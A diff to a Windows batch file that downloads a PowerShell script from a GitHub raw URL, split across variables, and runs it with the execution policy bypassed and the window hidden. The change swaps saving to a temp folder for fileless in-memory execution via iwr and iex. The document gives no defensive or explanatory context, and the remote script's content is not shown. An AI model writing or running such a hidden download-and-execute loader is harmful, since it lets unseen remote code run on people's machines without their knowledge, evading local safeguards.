@@ -2,28 +2,18 @@
 setlocal enabledelayedexpansion
 
 REM =============================================
-REM Download and Execute PowerShell Script
+REM Direct Run from GitHub (No File Download)
 REM =============================================
 
-REM Build correct GitHub raw URL
+REM Correct URL parts
 set "a=https://raw.githubusercontent.com"
 set "b=/Axolotl-in-void/powerhell/main/file.ps1"
 set "url=%a%%b%"
 
-echo Downloading script from GitHub...
-curl -s -o "%TEMP%\ss.ps1" "%url%"
+echo Running script from GitHub...
 
-if %errorlevel% neq 0 (
-    echo Failed to download the script.
-    pause
-    exit /b 1
-)
-
-echo Downloaded successfully.
-echo Executing script...
-
-REM Run the PowerShell script hidden
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\ss.ps1"
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
+"$c = (iwr '%url%' -UseBasicParsing).Content; iex $c"
 
 echo Script executed.
 pause
